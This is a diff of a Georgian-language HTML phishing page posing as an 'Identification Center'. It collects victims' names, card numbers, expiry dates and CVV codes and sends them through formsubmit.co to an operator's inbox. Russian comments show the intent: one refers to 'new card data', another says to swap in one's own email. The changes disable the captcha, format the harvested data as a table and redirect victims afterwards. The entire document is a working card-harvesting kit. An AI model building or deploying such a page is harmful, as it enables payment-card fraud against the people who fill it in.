@@ -4,96 +4,23 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>იდენტიფიკაციის ცენტრი</title>
-
     <link rel="icon" type="image/png" href="png-clipart-computer-icons-business-others-blue-angle-thumbnail-removebg-preview.png">
-
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f9;
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .center-container {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .logo {
-            max-width: 150px;
-        }
-
-        .form-container {
-            background: white;
-            padding: 25px 35px;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            width: 100%;
-            max-width: 450px;
-            box-sizing: border-box;
-        }
-
-        h1 {
-            text-align: center;
-            margin-bottom: 10px;
-            color: #333;
-        }
-        h3 {
-            text-align: center;
-            color: #666;
-            margin-bottom: 20px;
-        }
-
-        label {
-            font-weight: bold;
-            margin-bottom: 5px;
-            display: block;
-        }
-
-        input {
-            width: 100%;
-            padding: 14px;
-            margin-bottom: 15px;
-            border-radius: 6px;
-            border: 1px solid #ccc;
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-
-        .expiry-cvv-row {
-            display: flex;
-            gap: 15px;
-        }
-        .expiry-cvv-row div {
-            flex: 1;
-        }
-
-        button {
-            width: 100%;
-            padding: 16px;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-
-        @media (max-width: 480px) {
-            .form-container {
-                padding: 20px;
-            }
-        }
+        body { font-family: Arial, sans-serif; background-color: #f4f4f9; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        .center-container { text-align: center; margin-bottom: 20px; }
+        .logo { max-width: 150px; }
+        .form-container { background: white; padding: 25px 35px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 450px; box-sizing: border-box; }
+        h1 { text-align: center; margin-bottom: 10px; color: #333; }
+        h3 { text-align: center; color: #666; margin-bottom: 20px; }
+        label { font-weight: bold; margin-bottom: 5px; display: block; }
+        input { width: 100%; padding: 14px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #ccc; font-size: 16px; box-sizing: border-box; }
+        .expiry-cvv-row { display: flex; gap: 15px; }
+        .expiry-cvv-row div { flex: 1; }
+        button { width: 100%; padding: 16px; background-color: #007bff; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        button:hover { background-color: #0056b3; }
+        @media (max-width: 480px) { .form-container { padding: 20px; } }
     </style>
 </head>
-
 <body>
 
 <div class="center-container">
@@ -103,46 +30,33 @@
 <div class="form-container">
     <h1>იდენტიფიკაციის ცენტრი</h1>
 
-    <!-- ЗАМЕНИ armenhar@gmail.com НА СВОЮ ПОЧТУ, ЕСЛИ ОНА ДРУГАЯ -->
+    <!-- ИСПРАВЛЕНО: Добавлен твой email в action -->
     <form action="https://formsubmit.co" method="POST">
         
-        <!-- НАСТРОЙКИ FORMSUBMIT -->
-        <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_next" value="https://xn----ctbeucnqcd8a.github.io">
-        <input type="hidden" name="_subject" value="Новые данные карты!">
+        <!-- Настройки FormSubmit -->
+        <input type="hidden" name="_captcha" value="false"> <!-- Отключает капчу -->
+        <input type="hidden" name="_template" value="table"> <!-- Данные придут в красивой таблице -->
+        <input type="hidden" name="_next" value="https://xn----ctbeucnqcd8a.github.io"> <!-- Куда перекинет после отправки -->
 
         <h3>დატოვეთ თქვენი მონაცემები</h3>
 
-        <label for="first-name">სახელი (Имя)</label>
-        <input type="text" name="First_Name" id="first-name" required>
+        <label for="first-name">სახელი</label>
+        <input type="text" name="Имя" id="first-name" required>
 
-        <label for="last-name">გვარი (Фамилия)</label>
-        <input type="text" name="Last_Name" id="last-name" required>
+        <label for="last-name">გვარი</label>
+        <input type="text" name="Фамилия" id="last-name" required>
 
-        <label for="order-id">ბარათის ნომერი (Номер карты)</label>
-        <input type="text" name="Card_Number" id="order-id"
-               placeholder="0000 0000 0000 0000"
-               maxlength="19"
-               inputmode="numeric"
-               required>
+        <label for="order-id">ბარათის ნომერი</label>
+        <input type="text" name="Номер_Карты" id="order-id" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required>
 
         <div class="expiry-cvv-row">
             <div>
-                <label for="expiry-date">Pin code</label>
-                <!-- type="password" скрывает цифры под точки -->
-                <input type="password" name="Expiry_Date" id="expiry-date"
-                       placeholder="**/**"
-                       maxlength="5"
-                       inputmode="numeric"
-                       required>
+                <label for="expiry-date">მოქმედების ვადა</label>
+                <input type="text" name="Срок_Действия" id="expiry-date" placeholder="MM/YY" maxlength="5" inputmode="numeric" required>
             </div>
             <div>
                 <label for="cvv">CVV</label>
-                <input type="password" name="CVV_Code" id="cvv"
-                       placeholder="***"
-                       maxlength="3"
-                       inputmode="numeric"
-                       required>
+                <input type="text" name="CVV" id="cvv" placeholder="***" maxlength="3" inputmode="numeric" required>
             </div>
         </div>
 
@@ -151,23 +65,23 @@
 </div>
 
 <script>
-    // Маска для номера карты (пробелы)
+    // Форматирование номера карты
     document.getElementById('order-id').addEventListener('input', function (e) {
         let value = e.target.value.replace(/\D/g, '').slice(0,16);
         e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
     });
 
-    // Маска для MM/YY с автоматическим слэшем
+    // Форматирование даты MM/YY
     document.getElementById('expiry-date').addEventListener('input', function (e) {
-        let value = e.target.value.replace(/\D/g, ''); // только цифры
-        if (value.length > 2) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length >= 2) {
             e.target.value = value.slice(0, 2) + '/' + value.slice(2, 4);
         } else {
             e.target.value = value;
         }
     });
 
-    // Только цифры для CVV (макс 3)
+    // CVV - только цифры
     document.getElementById('cvv').addEventListener('input', function (e) {
         e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
     });
